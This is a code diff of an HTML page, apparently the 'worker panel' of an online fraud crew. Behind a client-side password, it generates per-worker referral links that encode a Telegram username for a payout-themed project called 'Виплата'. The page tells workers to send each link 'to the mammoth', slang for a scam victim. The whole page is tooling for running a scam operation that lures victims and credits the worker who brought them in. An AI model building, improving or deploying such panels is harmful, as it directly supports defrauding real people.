@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Создание ссылки</title>
+    <title>Панель Воркерів</title>
     <style>
         * {
             box-sizing: border-box;
@@ -11,140 +11,225 @@
             padding: 0;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f172a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #fff;
+            color: #e2e8f0;
+            overflow: hidden;
         }
-        .panel-container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 500px;
+        .container {
             width: 90%;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
             text-align: center;
-            transition: transform 0.3s ease;
         }
-        .panel-container:hover {
-            transform: translateY(-5px);
+        .panel {
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(34, 211, 238, 0.2);
+            transition: all 0.3s ease;
+        }
+        .panel:hover {
+            box-shadow: 0 25px 50px rgba(34, 211, 238, 0.15);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background: radial-gradient(circle at 30% 30%, #22d3ee, #06b6d4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: #0f172a;
+            font-weight: bold;
+        }
+        .logo.shield {
+            background: radial-gradient(circle at 30% 30%, #22d3ee, #0891b2);
         }
         h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 32px;
+            color: #22d3ee;
+            text-shadow: 0 0 10px rgba(34, 211, 238, 0.3);
         }
-        .form-group {
-            margin-bottom: 20px;
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
         }
-        label {
-            display: block;
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-        input {
+        .input-field {
             width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 12px;
+            padding: 16px 20px 16px 50px;
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(148, 163, 184, 0.3);
+            border-radius: 16px;
+            color: #e2e8f0;
             font-size: 16px;
-            color: #333;
             outline: none;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            transition: all 0.3s ease;
         }
-        input:focus {
-            border-color: #667eea;
-            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
+        .input-field:focus {
+            border-color: #22d3ee;
+            box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.2);
         }
-        button {
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 18px;
+        }
+        .btn {
             width: 100%;
-            padding: 14px;
-            background: #667eea;
+            padding: 16px;
+            background: linear-gradient(135deg, #22d3ee, #06b6d4);
             border: none;
-            border-radius: 12px;
-            color: #fff;
+            border-radius: 16px;
+            color: #0f172a;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s ease, transform 0.2s ease;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-        button:hover {
-            background: #764ba2;
+        .btn:hover {
+            background: linear-gradient(135deg, #06b6d4, #0891b2);
             transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(34, 211, 238, 0.3);
         }
-        button:active {
+        .btn:active {
             transform: translateY(0);
         }
         #result {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #333;
-            word-break: break-all;
+            margin-top: 24px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #cbd5e1;
         }
         #result a {
-            color: #667eea;
+            color: #22d3ee;
             text-decoration: none;
             font-weight: 500;
         }
         #result a:hover {
             text-decoration: underline;
         }
-        .error-message {
-            color: #dc3545;
+        .hidden {
+            display: none;
+        }
+        .error {
+            color: #f87171;
             font-size: 14px;
             margin-top: 10px;
-            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="panel-container">
-        <h1>Создание ссылки</h1>
-        <form id="workerForm">
-            <div class="form-group">
-                <label for="nick">Введи свой никнейм телеграм для отстука через @:</label>
-                <input type="text" id="nick" placeholder="@mynick" required>
-                <div class="error-message" id="error-message"></div>
+    <div class="container">
+
+        <!-- Экран входа -->
+        <div id="loginScreen" class="panel">
+            <div class="logo shield">🔒</div>
+            <h1>Вхід у панель</h1>
+            <div class="input-group">
+                <span class="input-icon">🔑</span>
+                <input type="password" id="password" class="input-field" placeholder="Введіть пароль">
             </div>
-            <button type="submit">Сгенерировать ссылку</button>
-        </form>
-        <div id="result"></div>
+            <button class="btn" onclick="checkPassword()">
+                <span>Увійти</span>
+                <span>➜</span>
+            </button>
+            <p class="error hidden" id="errorMsg">Невірний пароль!</p>
+        </div>
+
+        <!-- Генератор ссылок -->
+        <div id="generatorScreen" class="panel hidden">
+            <div class="logo">∞</div>
+            <h1>Генератор посилань</h1>
+            <div class="input-group">
+                <span class="input-icon">💎</span>
+                <select class="input-field" id="projectSelect">
+                    <option value="">Оберіть проект</option>
+                    <option value="viplata">Виплата</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <span class="input-icon">@</span>
+                <input type="text" id="username" class="input-field" placeholder="@username воркера">
+            </div>
+            <button class="btn" onclick="generateLink()">
+                <span>Створити посилання</span>
+                <span>✍️</span>
+            </button>
+            <div id="result"></div>
+        </div>
+
     </div>
 
     <script>
-        document.getElementById('workerForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const nickInput = document.getElementById('nick').value.trim();
-            const errorMessage = document.getElementById('error-message');
-            errorMessage.style.display = 'none';
+        const correctPassword = "1918";
 
-            // Проверяем, что ник начинается с @
-            if (!nickInput.startsWith('@') || nickInput.length < 2) {
-                errorMessage.textContent = 'Ник должен начинаться с @ и содержать хотя бы 1 символ после него';
-                errorMessage.style.display = 'block';
+        function checkPassword() {
+            const input = document.getElementById('password').value;
+            const error = document.getElementById('errorMsg');
+
+            if (input === correctPassword) {
+                document.getElementById('loginScreen').classList.add('hidden');
+                document.getElementById('generatorScreen').classList.remove('hidden');
+                error.classList.add('hidden');
+            } else {
+                error.classList.remove('hidden');
+                document.getElementById('password').value = '';
+            }
+        }
+
+        function generateLink() {
+            const project = document.getElementById('projectSelect').value;
+            const username = document.getElementById('username').value.trim();
+            const resultDiv = document.getElementById('result');
+
+            if (!project) {
+                resultDiv.innerHTML = `<p style="color:#f87171;">Оберіть проект!</p>`;
+                return;
+            }
+            if (!username || !username.startsWith('@') || username.length < 2) {
+                resultDiv.innerHTML = `<p style="color:#f87171;">Введіть коректний @username</p>`;
                 return;
             }
 
-            // Удаляем @ для кодирования
-            const nick = nickInput.substring(1);
+            const nick = username.substring(1);
             let refCode;
             try {
-                refCode = btoa(nick); // Кодируем ник в Base64
+                refCode = btoa(nick);
             } catch (e) {
-                errorMessage.textContent = 'Ошибка: используй только латинские буквы, цифры или символы Telegram-ника';
-                errorMessage.style.display = 'block';
+                resultDiv.innerHTML = `<p style="color:#f87171;">Помилка: використовуй латинські літери, цифри, _</p>`;
                 return;
             }
 
-            const currentDomain = window.location.origin; // Динамический домен
+            const currentDomain = window.location.origin;
             const refLink = `${currentDomain}/?ref=${encodeURIComponent(refCode)}`;
-            document.getElementById('result').innerHTML = `Твоя уникальная ссылка: <br><strong><a href="${refLink}" target="_blank">${refLink}</a></strong><br><br>Пришли ее мамонту!`;
+
+            resultDiv.innerHTML = `
+                <p>Твоя унікальна посилання:</p>
+                <strong><a href="${refLink}" target="_blank">${refLink}</a></strong>
+                <p style="margin-top:12px; font-size:13px;">Надішли її мамонту!</p>
+            `;
+        }
+
+        // Поддержка Enter в поле пароля
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkPassword();
         });
     </script>
 </body>
